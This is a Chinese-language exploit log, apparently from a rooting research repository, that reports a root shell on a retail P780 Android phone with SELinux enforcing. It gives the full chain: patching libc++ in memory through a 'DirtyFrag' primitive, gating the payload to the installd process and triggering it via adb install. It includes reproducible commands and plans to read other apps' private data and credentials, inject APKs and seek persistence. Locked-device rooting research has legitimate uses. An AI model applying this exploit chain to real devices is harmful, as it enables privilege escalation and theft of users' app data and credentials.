# P780 实机取得 uid 0 root shell（2026-10-25）

> **结论：在 Bootloader 锁定、SELinux Enforcing 的零售机上，以 installd 域取得了
> `uid=0` 的 `/system/bin/sh`，并能以 root 身份列出 `/data/data` 与 `/data/app` 全部目录。**
> 这是本仓库第一次真正拿到 root 级别的代码执行，而不是"受限域内的任意系统调用"。

## 1. 结果

```
uid=0(root) gid=0(root) groups=0(root) context=u:r:installd:s0
Enforcing
u:r:installd:s0
```

来源：`/data/local/tmp/p780_installd_shell`（属主 root，由 installd 域内的 shell 写入）。

| 能力 | 观测 |
|---|---|
| 身份 | `uid=0(root)`，域 `u:r:installd:s0` |
| SELinux | 仍为 `Enforcing`（未关闭、未改策略） |
| 执行 | 可 `exec /system/bin/sh`（策略 `allow installd shell_exec:file execute_no_trans`） |
| 写 | 可写 `/data/local/tmp`（`shell_data_file` 的 create/write 全权限） |
| 读 | `/data/data/*`、`/data/app/*` 均可展开列举 |
| 限制 | `/system` 只读；不能 exec `system_file` 里的其它二进制 |

## 2. 关键突破点：`/proc/self/comm` 是线程名

之前多次尝试在 installd 域里执行都"没有反应"，根因不是 SELinux，而是门控写错了：

- 钩子运行在 installd 的 **binder 线程**上；
- `/proc/self/comm` 返回的是**线程名**（`Binder:1281_2`），不是进程名 `installd`；
- 于是 `comm == "installd"` 永远不成立，载荷从未执行。

改用 `/proc/self/cmdline`（进程级，含 `/system/bin/installd`）后立即成功。

## 3. 方法

1. 从设备直接读取 SELinux 策略（`/system/etc/selinux/plat_sepolicy.cil` 等，全局可读），
   确认 `installd` 同时拥有 `shell_exec` 的执行权和 `shell_data_file` 的写权；
2. 用 DirtyFrag 改写 `/system/lib64/libc++.so` 的 `sentry` 入口（16 字节 trampoline），
   把载荷放进零引用的牺牲函数；
3. 载荷门控：`uid == 0` 且 `/proc/self/cmdline` 含 `inst`；
4. 触发：`adb install` 使 installd 走 `libbase::LogMessage` → libc++ `sentry` → 载荷；
5. 载荷 `fork` 后 `execve("/system/bin/sh", ["sh","-c", script])`，脚本以 `umask 0` 写结果并 `chmod 666`；
6. 全程可回滚：`unpatch` 恢复 `sentry` 入口与牺牲函数原始字节。

## 4. 可复现步骤（本仓库工具）

```
# 1) 构建并把 stub 写入 libc++
python 21-dirtyfrag-probe-20261025/build_patch.py libcxx
python 21-dirtyfrag-probe-20261025/gen_patchdata.py
python 21-dirtyfrag-probe-20261025/build_apk.py

# 2) 安装 App 并让它在 init 域写入补丁
adb install -r app-debug.apk
adb shell am start -n top.dcmqht.p780ipsec/.MainActivity -e probe patch

# 3) 触发 installd（任何一次安装都会让它走 LogMessage）
adb install -r app-debug.apk

# 4) 读取结果
adb shell cat /data/local/tmp/p780_installd_shell

# 5) 回滚
adb shell am start -n top.dcmqht.p780ipsec/.MainActivity -e probe unpatch
```

## 5. 边界与风险

- **域受限**：installd 域能做的仍有限——不能写 `/system`、不能 exec 系统二进制；
  `sh` 只能跑内建命令与脚本（`ls`/`cat` 之类的 toybox 二进制不可执行，但 shell 的
  glob、重定向、`read` 内建足以读写文件）。
- **不是持久 root**：重启后页缓存恢复，需重新打补丁。
- **触发依赖安装动作**：每次都要一次 `adb install`（或任何 installd 日志路径）。
- **本轮未关闭 SELinux、未修改任何分区、未刷写**；设备 uptime 连续，回滚后库字节与原始一致。

## 6. 为什么这一步重要

此前所有"root"尝试都停在"受限域内的任意系统调用"：init 域不能 exec、不能写 `/data`。
现在第一次拿到 `uid=0` 的 shell 与对 `/data/data` 的读取能力，意味着：

- 可以读取任意应用的私有数据（含可能存在的凭证/配置）；
- 可以把文件写进 `/data/app` 等 installd 管辖区域（后续可用于 APK 注入类实验）；
- 为"从 installd 域跳到更高权限域"提供了落脚点（例如修改某个系统应用的 APK 数据）。

## 7. 下一步候选

1. **验证写能力**：能否在 `/data/app` 内新建/替换文件（影响安装态）；
2. **纵向上探**：installd 能否通过 Binder 调用到 system_server 的接口；
3. **持久化路径**：是否有 installd 可写、且被 root 进程执行的路径（dalvik-cache 等）；
4. **回到 GhostLock**：现在有了 uid 0 的文件读写，profile 的几何字段仍缺，但载荷投递不再是问题。
